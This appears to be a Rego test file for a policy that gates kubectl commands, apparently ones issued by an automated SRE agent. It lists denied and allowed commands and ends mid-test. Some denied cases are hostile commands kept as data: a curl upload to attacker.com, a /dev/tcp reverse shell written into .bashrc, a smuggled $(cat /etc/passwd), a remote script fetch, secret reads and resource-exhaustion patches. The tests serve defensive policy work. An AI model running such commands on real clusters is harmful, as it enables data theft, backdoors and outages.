package policy_test

import data.policy

test_not_allow_1 if {
    not policy.allow with input as {"command": {"verb": "apply", "resource": null, "namespace": null, "args": [], "flags": [{"name": "-f", "value": "https://raw.githubusercontent.com/jaegertracing/jaeger-openshift/main/all-in-one/jaeger-all-in-one-openshift.yaml"}]}, "original_command": "kubectl apply -f https://raw.githubusercontent.com/jaegertracing/jaeger-openshift/main/all-in-one/jaeger-all-in-one-openshift.yaml"}
}

test_not_allow_2 if {
    not policy.allow with input as {"command": {"verb": "exec", "resource": "$(kubectl", "namespace": "otel-demo", "args": ["get", "pod", "nslookup", "ad"], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "-i", "value": null}, {"name": "-t", "value": null}, {"name": "-n", "value": "otel-demo"}, {"name": "-l", "value": "app=ad"}, {"name": "-o", "value": "jsonpath={.items[0].metadata.name})"}, {"name": "--", "value": null}]}, "original_command": "kubectl exec -n otel-demo -it $(kubectl get pod -n otel-demo -l app=ad -o jsonpath=\"{.items[0].metadata.name}\") -- nslookup ad"}
}

test_not_allow_3 if {
    not policy.allow with input as {"command": {"verb": "get", "resource": "statefulsets", "namespace": null, "args": ["|", "grep", "email"], "flags": [{"name": "-o", "value": "jsonpath={range .items[*]}{.metadata.name}{\"\\t\"}{.metadata.namespace}{\"\\n\"}{end}"}]}, "original_command": "kubectl get statefulsets -o jsonpath=\"{range .items[*]}{.metadata.name}{\"\\t\"}{.metadata.namespace}{\"\\n\"}{end}\" | grep email"}
}

test_not_allow_4 if {
    not policy.allow with input as {"command": {"verb": "get", "resource": "pv", "namespace": null, "args": ["|", "jq", ".items[] | select(.spec.claimRef.name == \"api-service\")"], "flags": [{"name": "-A", "value": null}, {"name": "-o", "value": "json"}, {"name": "-r", "value": null}]}, "original_command": "kubectl get pv -A -o json | jq -r \".items[] | select(.spec.claimRef.name == \"api-service\")\""}
}

test_not_allow_5 if {
    not policy.allow with input as {"command": {"verb": "get", "resource": "secret", "namespace": "otel-demo", "args": ["otel-demo"], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "-o", "value": "yaml"}]}, "original_command": "kubectl get secret otel-demo -n otel-demo -o yaml"}
}

test_not_allow_6 if {
    not policy.allow with input as {"command": {"verb": "describe", "resource": "pv", "namespace": null, "args": ["&&", "kubectl", "describe", "pvc"], "flags": []}, "original_command": "kubectl describe pv && kubectl describe pvc"}
}

test_not_allow_7 if {
    not policy.allow with input as {"command": {"verb": null, "resource": "for", "namespace": "$namespace", "args": ["namespace", "in", "default", "ingress-nginx", "opentelemetry-operator;", "do", "echo", "$namespace;", "kubectl", "get", "deployments", "done"], "flags": [{"name": "-n", "value": "$namespace"}, {"name": "--field-selector", "value": "metadata.name=flagd"}, {"name": "-o", "value": "name;"}]}, "original_command": "for namespace in default ingress-nginx opentelemetry-operator; do echo $namespace; kubectl get deployments -n $namespace --field-selector=metadata.name=flagd -o name; done"}
}

test_not_allow_8 if {
    not policy.allow with input as {"command": {"verb": "apply", "resource": null, "namespace": "default", "args": [], "flags": [{"name": "-f", "value": "/path/to/frontend-proxy-service.yaml"}, {"name": "-n", "value": "default"}]}, "original_command": "kubectl apply -f /path/to/frontend-proxy-service.yaml -n default"}
}

test_not_allow_9 if {
    not policy.allow with input as {"command": {"verb": "run", "resource": null, "namespace": null, "args": [], "flags": [{"name": "--image", "value": "ghcr.io/open-telemetry/demo:2.0.1-frontend-proxy"}, {"name": "--rm", "value": null}, {"name": "-i", "value": null}, {"name": "-t", "value": null}, {"name": "--restart", "value": "Never"}]}, "original_command": "kubectl run --image=ghcr.io/open-telemetry/demo:2.0.1-frontend-proxy --rm -it --restart=Never\""}
}

test_not_allow_10 if {
    not policy.allow with input as {"command": {"verb": "patch", "resource": "deployment/ad", "namespace": "otel-demo", "args": [], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "--type", "value": "json"}, {"name": "-p", "value": "[{\"op\": \"replace\", \"path\": \"/spec/template/spec/containers/0/image\", \"value\":\"ad-image:1.2.3\"}]"}]}, "original_command": "kubectl patch deployment/ad -n otel-demo --type=\"json\" -p=\"[{\"op\": \"replace\", \"path\": \"/spec/template/spec/containers/0/image\", \"value\":\"ad-image:1.2.3\"}]\""}
}

test_not_allow_11 if {
    not policy.allow with input as {"command": {"verb": "exec", "resource": "checkout-6985f55d55-rfzjw", "namespace": "otel-demo", "args": ["/bin/sh"], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "-c", "value": "checkout"}, {"name": "--", "value": null}, {"name": "-c", "value": "docker inspect -f=\"{{.Config.Image}}\" checkout"}]}, "original_command": "kubectl exec -n otel-demo checkout-6985f55d55-rfzjw -c checkout -- /bin/sh -c \"docker inspect -f=\"{{.Config.Image}}\" checkout\""}
}

test_not_allow_12 if {
    not policy.allow with input as {"command": {"verb": "logs", "resource": "$(kubectl", "namespace": "<namespace>", "args": ["get", "pods"], "flags": [{"name": "-n", "value": "<namespace>"}, {"name": "-n", "value": "<namespace>"}, {"name": "--selector", "value": "app=frontend"}, {"name": "-o", "value": "jsonpath={.items[0].metadata.name})"}]}, "original_command": "kubectl logs -n <namespace> $(kubectl get pods -n <namespace> --selector=app=frontend -o jsonpath=\"{.items[0].metadata.name}\")"}
}

test_not_allow_13 if {
    not policy.allow with input as {"command": {"verb": null, "resource": "for", "namespace": "default;", "args": ["pod", "in", "$(kubectl", "get", "pods", "do", "echo", "$pod;", "kubectl", "describe", "pod", "$pod", "done"], "flags": [{"name": "-n", "value": "default"}, {"name": "-l", "value": "app=ShippingService"}, {"name": "-o", "value": "jsonpath={.items[*].metadata.name});"}, {"name": "-n", "value": "default;"}]}, "original_command": "for pod in $(kubectl get pods -n default -l app=ShippingService -o jsonpath=\"{.items[*].metadata.name}\"); do echo $pod; kubectl describe pod $pod -n default; done"}
}

test_not_allow_14 if {
    not policy.allow with input as {"command": {"verb": "get", "resource": "imagepullsecrets", "namespace": null, "args": [], "flags": [{"name": "--all-namespaces", "value": null}]}, "original_command": "kubectl get imagepullsecrets --all-namespaces"}
}

test_not_allow_15 if {
    not policy.allow with input as {"command": {"verb": "create", "resource": "deployment", "namespace": "otel-demo", "args": ["AdService"], "flags": [{"name": "--image", "value": "oteldemo.AdService"}, {"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl create deployment AdService --image=oteldemo.AdService -n otel-demo"}
}

test_not_allow_16 if {
    not policy.allow with input as {"command": {"verb": "get", "resource": "pods", "namespace": "otel-demo", "args": ["|", "grep", "100.96.4.190"], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "-o", "value": "jsonpath={range .items[*]}{.metadata.name}{\"\\t\"}{.status.podIP}{\"\\n\"}{end}"}]}, "original_command": "kubectl get pods -n otel-demo -o=jsonpath=\"{range .items[*]}{.metadata.name}{\"\\t\"}{.status.podIP}{\"\\n\"}{end}\" | grep 100.96.4.190"}
}

test_not_allow_17 if {
    not policy.allow with input as {"command": {"verb": "get", "resource": "networkpolicy", "namespace": "otel-demo", "args": ["shipping"], "flags": [{"name": "-o", "value": "yaml"}, {"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl get networkpolicy shipping -o yaml -n otel-demo"}
}

test_not_allow_18 if {
    not policy.allow with input as {"command": {"verb": "patch", "resource": "deployment/ad", "namespace": "default", "args": [], "flags": [{"name": "-n", "value": "default"}, {"name": "--type", "value": "json"}, {"name": "-p", "value": "[{\"op\": \"replace\", \"path\": \"/spec/template/spec/containers/0/image\", \"value\":\"ad-image:1.2.3\"}]"}]}, "original_command": "kubectl patch deployment/ad -n default --type=\"json\" -p=\"[{\"op\": \"replace\", \"path\": \"/spec/template/spec/containers/0/image\", \"value\":\"ad-image:1.2.3\"}]\""}
}

test_not_allow_19 if {
    not policy.allow with input as {"command": {"verb": "get", "resource": "traces", "namespace": null, "args": ["frontend"], "flags": []}, "original_command": "kubectl get traces frontend"}
}

test_not_allow_20 if {
    not policy.allow with input as {"command": {"verb": null, "resource": "for", "namespace": "$namespace", "args": ["namespace", "in", "ingress-nginx", "opentelemetry-operator;", "do", "echo", "$namespace;", "kubectl", "get", "pods", "done"], "flags": [{"name": "-n", "value": "$namespace"}, {"name": "-l", "value": "app=flagd"}, {"name": "-o", "value": "yaml;"}]}, "original_command": "for namespace in ingress-nginx opentelemetry-operator; do echo $namespace; kubectl get pods -n $namespace -l app=flagd -o yaml; done"}
}

test_not_allow_21 if {
    not policy.allow with input as {"command": {"verb": "patch", "resource": "configmap", "namespace": "default", "args": ["flagd-config"], "flags": [{"name": "-n", "value": "default"}, {"name": "--type", "value": "json"}, {"name": "-p", "value": "[{\"op\": \"add\", \"path\": \"/data/product-catalog-failure\", \"value\": \"false\"}]"}]}, "original_command": "kubectl patch configmap flagd-config -n default --type=\"json\" -p=\"[{\"op\": \"add\", \"path\": \"/data/product-catalog-failure\", \"value\": \"false\"}]\""}
}

test_not_allow_22 if {
    not policy.allow with input as {"command": {"verb": "logs", "resource": "$(kubectl", "namespace": "default", "args": ["get", "pods"], "flags": [{"name": "-n", "value": "default"}, {"name": "-n", "value": "default"}, {"name": "-l", "value": "app=frontend"}, {"name": "-o", "value": "jsonpath={.items[0].metadata.name})"}]}, "original_command": "kubectl logs -n default $(kubectl get pods -n default -l app=frontend -o jsonpath=\"{.items[0].metadata.name}\")"}
}

test_not_allow_23 if {
    not policy.allow with input as {"command": {"verb": "get", "resource": "pods", "namespace": "otel-demo", "args": [], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "-l", "value": "$(cat /etc/passwd) in (email,checkout)"}]}, "original_command": "kubectl get pods -n otel-demo -l $(cat /etc/passwd) in (email,checkout)"}
}

test_not_allow_24 if {
    not policy.allow with input as {"command": {"verb": "exec", "resource": "frontend", "namespace": "otel-demo", "args": ["curl", "http://100.67.123.195"], "flags": [{"name": "-i", "value": null}, {"name": "-t", "value": null}, {"name": "-n", "value": "otel-demo"}, {"name": "--", "value": null}, {"name": "-I", "value": null}]}, "original_command": "kubectl exec -it -n otel-demo frontend -- curl -I http://100.67.123.195"}
}

test_not_allow_25 if {
    not policy.allow with input as {"command": {"verb": "describe", "resource": "secret", "namespace": "otel-demo", "args": ["product-catalog-dockercfg"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl describe secret product-catalog-dockercfg -n otel-demo"}
}

test_not_allow_26 if {
    not policy.allow with input as {"command": {"verb": "get", "resource": "service", "namespace": "$(kubectl", "args": ["frontend", "|", "grep", "clusterIP|port", "&&", "kubectl", "run", "test-pod", "get", "service", "frontend", "sh"], "flags": [{"name": "-o", "value": "yaml"}, {"name": "-E", "value": null}, {"name": "-i", "value": null}, {"name": "-t", "value": null}, {"name": "--rm", "value": null}, {"name": "--image", "value": "busybox"}, {"name": "--restart", "value": "Never"}, {"name": "--namespace", "value": "$(kubectl"}, {"name": "-o", "value": "jsonpath={.metadata.namespace})"}, {"name": "--", "value": null}, {"name": "-c", "value": "nc -zv 100.67.244.159 8080"}]}, "original_command": "kubectl get service frontend -o yaml | grep -E \"clusterIP|port\" && kubectl run -it --rm --image=busybox --restart=Never test-pod --namespace=$(kubectl get service frontend -o jsonpath=\"{.metadata.namespace}\") -- sh -c \"nc -zv 100.67.244.159 8080\""}
}

test_not_allow_27 if {
    not policy.allow with input as {"command": {"verb": "get", "resource": "pods", "namespace": "otel-demo", "args": ["|", "grep", "recommendation"], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "-o", "value": "custom-columns=NAME:.metadata.name"}, {"name": "--no-headers", "value": "true"}]}, "original_command": "kubectl get pods -n otel-demo -o=custom-columns=NAME:.metadata.name --no-headers=true | grep recommendation"}
}

test_not_allow_28 if {
    not policy.allow with input as {"command": {"verb": null, "resource": "docker", "namespace": null, "args": ["tag", "frontend-proxy-image", "<your-registry-url>/frontend-proxy-image:latest", "&&", "docker", "push", "<your-registry-url>/frontend-proxy-image:latest"], "flags": []}, "original_command": "docker tag frontend-proxy-image <your-registry-url>/frontend-proxy-image:latest && docker push <your-registry-url>/frontend-proxy-image:latest"}
}

test_not_allow_29 if {
    not policy.allow with input as {"command": {"verb": null, "resource": "for", "namespace": "$ns", "args": ["ns", "in", "$(kubectl", "config", "view", "do", "echo", "$ns;", "kubectl", "get", "svc", "done"], "flags": [{"name": "--minify", "value": null}, {"name": "-o", "value": "jsonpath={range .clusters[*].contexts[*]}{.context.namespace}{\"\\n\"}{end});"}, {"name": "-n", "value": "$ns"}, {"name": "-o", "value": "jsonpath={range .items[*]}{.metadata.name}{\"\\t\"}{.metadata.namespace}{\"\\n\"}{end};"}]}, "original_command": "for ns in $(kubectl config view --minify -o jsonpath=\"{range .clusters[*].contexts[*]}{.context.namespace}{\"\\n\"}{end}\"); do echo $ns; kubectl get svc -n $ns -o jsonpath=\"{range .items[*]}{.metadata.name}{\"\\t\"}{.metadata.namespace}{\"\\n\"}{end}\"; done"}
}

test_not_allow_30 if {
    not policy.allow with input as {"command": {"verb": "apply", "resource": null, "namespace": "default", "args": [], "flags": [{"name": "-f", "value": "/path/to/frontend-proxy-service.yaml"}, {"name": "-n", "value": "default"}]}, "original_command": "kubectl apply -f /path/to/frontend-proxy-service.yaml -n default"}
}

test_not_allow_31 if {
    not policy.allow with input as {"command": {"verb": null, "resource": "bash\\nkubectl", "namespace": "otel-demo", "args": ["patch", "deployment/frontend-proxy", "{\\\"spec\\\": {\\\"template\\\": {\\\"spec\\\": {\\\"containers\\\": [{\\\"name\\\": \\\"frontend-proxy\\\", \\\"resources\\\": {\\\"limits\\\": {\\\"memory\\\": \\\"30Gi\\\"}}}]}}}}"], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "--patch", "value": null}]}, "original_command": "bash\\nkubectl patch deployment/frontend-proxy -n otel-demo --patch \"{\\\"spec\\\": {\\\"template\\\": {\\\"spec\\\": {\\\"containers\\\": [{\\\"name\\\": \\\"frontend-proxy\\\", \\\"resources\\\": {\\\"limits\\\": {\\\"memory\\\": \\\"30Gi\\\"}}}]}}}}"}
}

test_not_allow_32 if {
    not policy.allow with input as {"command": {"verb": "get", "resource": "services", "namespace": null, "args": ["|", "jq", ".items[].metadata.name | select(. | contains(\"api-service\"))"], "flags": [{"name": "--all-namespaces", "value": null}, {"name": "-o", "value": "json"}, {"name": "-r", "value": null}]}, "original_command": "kubectl get services --all-namespaces -o json | jq -r \".items[].metadata.name | select(. | contains(\"api-service\"))\""}
}

test_not_allow_33 if {
    not policy.allow with input as {"command": {"verb": "get", "resource": "secret", "namespace": "otel-demo", "args": ["quay-registry-secret"], "flags": [{"name": "-o", "value": "yaml"}, {"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl get secret quay-registry-secret -o yaml -n otel-demo"}
}

test_not_allow_34 if {
    not policy.allow with input as {"command": {"verb": "get", "resource": "deployments", "namespace": "production", "args": ["|", "grep", "email"], "flags": [{"name": "-n", "value": "production"}, {"name": "-o", "value": "jsonpath={range .items[*]}{.metadata.name}{\"\\t\"}{.spec.template.spec.containers[0].image}{\"\\n\"}{end}"}]}, "original_command": "kubectl get deployments -n production -o jsonpath=\"{range .items[*]}{.metadata.name}{\"\\t\"}{.spec.template.spec.containers[0].image}{\"\\n\"}{end}\" | grep email"}
}

test_not_allow_35 if {
    not policy.allow with input as {"command": {"verb": "get", "resource": "ingress", "namespace": null, "args": ["|", "jq", ".items[] | select(.spec.rules[].host == \"api-service\")"], "flags": [{"name": "-A", "value": null}, {"name": "-o", "value": "json"}, {"name": "-r", "value": null}]}, "original_command": "kubectl get ingress -A -o json | jq -r \".items[] | select(.spec.rules[].host == \"api-service\")\""}
}

test_not_allow_36 if {
    not policy.allow with input as {"command": {"verb": "get", "resource": "pods", "namespace": null, "args": ["|", "grep", "frontend"], "flags": [{"name": "-A", "value": null}]}, "original_command": "kubectl get pods -A | grep frontend"}
}

test_not_allow_37 if {
    not policy.allow with input as {"command": {"verb": "apply", "resource": null, "namespace": null, "args": [], "flags": [{"name": "-f", "value": "/path/to/frontend-deployment.yaml"}]}, "original_command": "kubectl apply -f /path/to/frontend-deployment.yaml"}
}

test_not_allow_38 if {
    not policy.allow with input as {"command": {"verb": "get", "resource": "secret", "namespace": "default", "args": ["app-image-pull-secret"], "flags": [{"name": "-n", "value": "default"}, {"name": "-o", "value": "yaml"}]}, "original_command": "kubectl get secret app-image-pull-secret -n default -o yaml"}
}

test_not_allow_39 if {
    not policy.allow with input as {"command": {"verb": "patch", "resource": "deployment", "namespace": "sre-sandbox", "args": ["myapp"], "flags": [{"name": "-n", "value": "sre-sandbox"}, {"name": "--type", "value": "json"}, {"name": "-p", "value": "[{\"op\":\"replace\",\"path\":\"/spec/template/spec/containers/0/resources/requests/cpu\",\"value\":\"10000\"},{\"op\":\"replace\",\"path\":\"/spec/template/spec/containers/0/resources/limits/cpu\",\"value\":\"20000\"}]"}]}, "original_command": "kubectl patch deployment myapp -n sre-sandbox --type=\"json\" -p=\"[{\"op\":\"replace\",\"path\":\"/spec/template/spec/containers/0/resources/requests/cpu\",\"value\":\"10000\"},{\"op\":\"replace\",\"path\":\"/spec/template/spec/containers/0/resources/limits/cpu\",\"value\":\"20000\"}]\""}
}

test_not_allow_40 if {
    not policy.allow with input as {"command": {"verb": "exec", "resource": "pod", "namespace": "sre-sandbox", "args": ["pod", "sh"], "flags": [{"name": "-n", "value": "sre-sandbox"}, {"name": "--", "value": null}, {"name": "-c", "value": "curl -X POST -d @- http://attacker.com/upload"}]}, "original_command": "kubectl exec pod -n sre-sandbox -- sh -c \"curl -X POST -d @- http://attacker.com/upload\""}
}

test_not_allow_41 if {
    not policy.allow with input as {"command": {"verb": "scale", "resource": "deployment", "namespace": "sre-sandbox", "args": ["frontend", "backend"], "flags": [{"name": "--replicas", "value": "500"}, {"name": "--replicas", "value": "500"}, {"name": "-n", "value": "sre-sandbox"}]}, "original_command": "kubectl scale deployment frontend --replicas=500 backend --replicas=500 -n sre-sandbox"}
}

test_not_allow_42 if {
    not policy.allow with input as {"command": {"verb": "patch", "resource": "deployment", "namespace": "sre-sandbox", "args": ["myapp"], "flags": [{"name": "-n", "value": "sre-sandbox"}, {"name": "--type", "value": "json"}, {"name": "-p", "value": "[{\"op\":\"replace\",\"path\":\"/spec/template/spec/containers/0/resources/requests/cpu\",\"value\":\"5000\"},{\"op\":\"replace\",\"path\":\"/spec/template/spec/containers/0/resources/limits/memory\",\"value\":\"1Ti\"}]"}]}, "original_command": "kubectl patch deployment myapp -n sre-sandbox --type=\"json\" -p=\"[{\"op\":\"replace\",\"path\":\"/spec/template/spec/containers/0/resources/requests/cpu\",\"value\":\"5000\"},{\"op\":\"replace\",\"path\":\"/spec/template/spec/containers/0/resources/limits/memory\",\"value\":\"1Ti\"}]\""}
}

test_not_allow_43 if {
    not policy.allow with input as {"command": {"verb": "patch", "resource": "deployment", "namespace": "sre-sandbox", "args": ["myapp"], "flags": [{"name": "-n", "value": "sre-sandbox"}, {"name": "-p", "value": "{\"spec\":{\"template\":{\"spec\":{\"containers\":[{\"name\":\"myapp\",\"command\":[\"/tmp/evil.sh\"]}]}}}}"}]}, "original_command": "kubectl patch deployment myapp -n sre-sandbox -p \"{\"spec\":{\"template\":{\"spec\":{\"containers\":[{\"name\":\"myapp\",\"command\":[\"/tmp/evil.sh\"]}]}}}}\""}
}

test_not_allow_44 if {
    not policy.allow with input as {"command": {"verb": "scale", "resource": "job", "namespace": "sre-sandbox", "args": ["heavy-job"], "flags": [{"name": "--replicas", "value": "500"}, {"name": "-n", "value": "sre-sandbox"}]}, "original_command": "kubectl scale job heavy-job --replicas=500 -n sre-sandbox"}
}

test_not_allow_45 if {
    not policy.allow with input as {"command": {"verb": "patch", "resource": "deployment", "namespace": "sre-sandbox", "args": ["myapp"], "flags": [{"name": "-n", "value": "sre-sandbox"}, {"name": "-p", "value": "{\"spec\":{\"template\":{\"spec\":{\"containers\":[{\"name\":\"myapp\",\"command\":[\"curl\",\"http://website.com/myapp.sh\",\"-o\",\"/tmp/myapp.sh\"]}]}}}}"}]}, "original_command": "kubectl patch deployment myapp -n sre-sandbox -p \"{\"spec\":{\"template\":{\"spec\":{\"containers\":[{\"name\":\"myapp\",\"command\":[\"curl\",\"http://website.com/myapp.sh\",\"-o\",\"/tmp/myapp.sh\"]}]}}}}\""}
}

test_not_allow_46 if {
    not policy.allow with input as {"command": {"verb": "patch", "resource": "deployment", "namespace": "sre-sandbox", "args": ["myapp"], "flags": [{"name": "-n", "value": "sre-sandbox"}, {"name": "-p", "value": "{\"spec\":{\"template\":{\"spec\":{\"containers\":[{\"name\":\"myapp\",\"command\":[\"/opt/scripts/back.sh\"]}]}}}}"}]}, "original_command": "kubectl patch deployment myapp -n sre-sandbox -p \"{\"spec\":{\"template\":{\"spec\":{\"containers\":[{\"name\":\"myapp\",\"command\":[\"/opt/scripts/back.sh\"]}]}}}}\""}
}

test_not_allow_47 if {
    not policy.allow with input as {"command": {"verb": "scale", "resource": "deployment", "namespace": "sre-sandbox", "args": ["myapp"], "flags": [{"name": "--replicas", "value": "1000"}, {"name": "-n", "value": "sre-sandbox"}]}, "original_command": "kubectl scale deployment myapp --replicas=1000 -n sre-sandbox"}
}

test_not_allow_48 if {
    not policy.allow with input as {"command": {"verb": "patch", "resource": "deployment", "namespace": "sre-sandbox", "args": ["myapp"], "flags": [{"name": "-n", "value": "sre-sandbox"}, {"name": "-p", "value": "{\"spec\":{\"template\":{\"spec\":{\"containers\":[{\"name\":\"myapp\",\"command\":[\"sleep\",\"3600\"]}]}}}}"}]}, "original_command": "kubectl patch deployment myapp -n sre-sandbox -p \"{\"spec\":{\"template\":{\"spec\":{\"containers\":[{\"name\":\"myapp\",\"command\":[\"sleep\",\"3600\"]}]}}}}\""}
}

test_not_allow_49 if {
    not policy.allow with input as {"command": {"verb": "scale", "resource": "job", "namespace": "sre-sandbox", "args": ["heavy-job"], "flags": [{"name": "--replicas", "value": "1000"}, {"name": "-n", "value": "sre-sandbox"}]}, "original_command": "kubectl scale job heavy-job --replicas=1000 -n sre-sandbox"}
}

test_not_allow_50 if {
    not policy.allow with input as {"command": {"verb": "exec", "resource": "pod", "namespace": "sre-sandbox", "args": ["pod", "sh", "apply"], "flags": [{"name": "--", "value": null}, {"name": "-c", "value": "echo \"bash -i >& /dev/tcp/192.168.1.99/4444 0>&1\" >> ~/.bashrc\\,kubectl"}, {"name": "-f", "value": "privpod.yaml"}, {"name": "-n", "value": "sre-sandbox"}]}, "original_command": "kubectl exec pod -- sh -c \"echo \"bash -i >& /dev/tcp/192.168.1.99/4444 0>&1\" >> ~/.bashrc\\\",kubectl apply -f privpod.yaml -n sre-sandbox"}
}

test_not_allow_51 if {
    not policy.allow with input as {"command": {"verb": "patch", "resource": "deployment", "namespace": "sre-sandbox", "args": ["myapp"], "flags": [{"name": "-n", "value": "sre-sandbox"}, {"name": "--type", "value": "json"}, {"name": "-p", "value": "[{\"op\":\"replace\",\"path\":\"/spec/template/spec/containers/0/resources/requests/cpu\",\"value\":\"1000\"},{\"op\":\"replace\",\"path\":\"/spec/template/spec/containers/0/resources/limits/memory\",\"value\":\"500Gi\"}]"}]}, "original_command": "kubectl patch deployment myapp -n sre-sandbox --type=\"json\" -p=\"[{\"op\":\"replace\",\"path\":\"/spec/template/spec/containers/0/resources/requests/cpu\",\"value\":\"1000\"},{\"op\":\"replace\",\"path\":\"/spec/template/spec/containers/0/resources/limits/memory\",\"value\":\"500Gi\"}]\""}
}

test_not_allow_52 if {
    not policy.allow with input as {"command": {"verb": "patch", "resource": "deployment", "namespace": "sre-sandbox", "args": ["myapp"], "flags": [{"name": "-n", "value": "sre-sandbox"}, {"name": "--type", "value": "json"}, {"name": "-p", "value": "[{\"op\":\"replace\",\"path\":\"/spec/template/spec/containers/0/resources/limits/cpu\",\"value\":\"2000\"},{\"op\":\"replace\",\"path\":\"/spec/template/spec/containers/0/resources/requests/memory\",\"value\":\"800Gi\"}]"}]}, "original_command": "kubectl patch deployment myapp -n sre-sandbox --type=\"json\" -p=\"[{\"op\":\"replace\",\"path\":\"/spec/template/spec/containers/0/resources/limits/cpu\",\"value\":\"2000\"},{\"op\":\"replace\",\"path\":\"/spec/template/spec/containers/0/resources/requests/memory\",\"value\":\"800Gi\"}]\""}
}

test_allow_1 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": "production", "args": ["shipping"], "flags": [{"name": "-n", "value": "production"}, {"name": "-o", "value": "yaml"}]}, "original_command": "kubectl get deployment shipping -n production -o yaml"}
}

test_allow_2 if {
    policy.allow with input as {"command": {"verb": "top", "resource": "node", "namespace": null, "args": ["i-0448eae150624bdb0"], "flags": [{"name": "-o", "value": "wide"}, {"name": "--sort-by", "value": "cpu"}]}, "original_command": "kubectl top node i-0448eae150624bdb0 -o wide --sort-by=cpu"}
}

test_allow_3 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": "otel-demo", "args": ["quote"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl get deployment quote -n otel-demo"}
}

test_allow_4 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pods", "namespace": "default", "args": [], "flags": [{"name": "-n", "value": "default"}, {"name": "-l", "value": "app=product-catalog"}, {"name": "-o", "value": "custom-columns=NAME:.metadata.name,LABELS:.metadata.labels"}]}, "original_command": "kubectl get pods -n default -l app=product-catalog -o custom-columns=NAME:.metadata.name,LABELS:.metadata.labels"}
}

test_allow_5 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "pod", "namespace": "otel-demo", "args": ["checkout-6985f55d55-b5rtm"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl describe pod checkout-6985f55d55-b5rtm -n otel-demo"}
}

test_allow_6 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "configmaps", "namespace": null, "args": [], "flags": [{"name": "--all-namespaces", "value": null}]}, "original_command": "kubectl describe configmaps --all-namespaces"}
}

test_allow_7 if {
    policy.allow with input as {"command": {"verb": "logs", "resource": null, "namespace": "default", "args": [], "flags": [{"name": "-l", "value": "app=frontend-proxy"}, {"name": "-n", "value": "default"}]}, "original_command": "kubectl logs -l app=frontend-proxy -n default"}
}

test_allow_8 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "pod", "namespace": "otel-demo", "args": ["frontend-77c7685488-7cxhd"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl describe pod frontend-77c7685488-7cxhd -n otel-demo"}
}

test_allow_9 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": null, "args": ["email-service"], "flags": [{"name": "-o", "value": "yaml"}]}, "original_command": "kubectl get deployment email-service -o yaml"}
}

test_allow_10 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "pods", "namespace": "checkout", "args": [], "flags": [{"name": "-n", "value": "checkout"}]}, "original_command": "kubectl get pods -n checkout"}
}

test_allow_11 if {
    policy.allow with input as {"command": {"verb": "logs", "resource": null, "namespace": "otel-demo", "args": ["email-69965c8d54-wmqkc"], "flags": [{"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl logs email-69965c8d54-wmqkc -n otel-demo"}
}

test_allow_12 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "service", "namespace": "production", "args": ["email-service"], "flags": [{"name": "-n", "value": "production"}]}, "original_command": "kubectl get service email-service -n production"}
}

test_allow_13 if {
    policy.allow with input as {"command": {"verb": "top", "resource": "pod", "namespace": "otel-demo", "args": [], "flags": [{"name": "-n", "value": "otel-demo"}, {"name": "--selector", "value": "app=recommendation"}]}, "original_command": "kubectl top pod -n otel-demo --selector=app=recommendation"}
}

test_allow_14 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment", "namespace": "production", "args": ["checkout"], "flags": [{"name": "-o", "value": "yaml"}, {"name": "-n", "value": "production"}]}, "original_command": "kubectl get deployment checkout -o yaml -n production"}
}

test_allow_15 if {
    policy.allow with input as {"command": {"verb": "logs", "resource": null, "namespace": "default", "args": ["product-catalog"], "flags": [{"name": "-n", "value": "default"}]}, "original_command": "kubectl logs product-catalog -n default"}
}

test_allow_16 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployments", "namespace": "openshift-monitoring", "args": [], "flags": [{"name": "-n", "value": "openshift-monitoring"}, {"name": "-o", "value": "yaml"}]}, "original_command": "kubectl get deployments -n openshift-monitoring -o yaml"}
}

test_allow_17 if {
    policy.allow with input as {"command": {"verb": "describe", "resource": "pods", "namespace": "otel-demo", "args": [], "flags": [{"name": "-l", "value": "app=email"}, {"name": "-n", "value": "otel-demo"}]}, "original_command": "kubectl describe pods -l app=email -n otel-demo"}
}

test_allow_18 if {
    policy.allow with input as {"command": {"verb": "get", "resource": null, "namespace": null, "args": ["svc", "checkout-service"], "flags": [{"name": "-A", "value": null}, {"name": "-o", "value": "yaml"}]}, "original_command": "kubectl get svc checkout-service -A -o yaml"}
}

test_allow_19 if {
    policy.allow with input as {"command": {"verb": "logs", "resource": null, "namespace": "default", "args": ["adservice-pod"], "flags": [{"name": "-n", "value": "default"}]}, "original_command": "kubectl logs adservice-pod -n default"}
}

test_allow_20 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployments", "namespace": "<correct_namespace>", "args": [], "flags": [{"name": "-n", "value": "<correct_namespace>"}]}, "original_command": "kubectl get deployments -n <correct_namespace>"}
}

test_allow_21 if {
    policy.allow with input as {"command": {"verb": "get", "resource": "deployment,pods", "namespace": "default", "args": [], "flags": [{"name": "-n", "value": "default"}, {"name": "-l", "value": "app=product-data"}]}, "original_command": "kubectl get deployment,pods -n default -l app=product-data"}
}

test_allow_22 if {
